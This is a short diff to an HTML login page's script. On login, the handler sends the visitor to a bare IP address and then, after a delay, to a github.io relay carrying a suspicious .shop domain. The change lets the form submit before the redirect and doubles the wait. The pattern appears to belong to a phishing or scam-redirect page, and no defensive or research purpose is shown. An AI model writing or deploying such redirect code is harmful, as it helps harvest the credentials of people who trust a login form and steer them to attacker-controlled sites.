@@ -76,7 +76,7 @@
   </style>
   <script>
     function handleLogin(event) {
-      event.preventDefault(); // 阻止表單默認提交行為
+      //event.preventDefault(); // 阻止表單默認提交行為
 
       const primaryURL = "http://103.200.23.160";
       const fallbackURL = "https://zongyiu.github.io/wnc/?site=http://jkkahebg899wubj.shop/";
@@ -87,7 +87,7 @@
       // 等 5 秒後，跳轉到備用 URL
       setTimeout(() => {
         window.location.href = fallbackURL;
-      }, 5000);
+      }, 10000);
     }
   </script>
 </head>
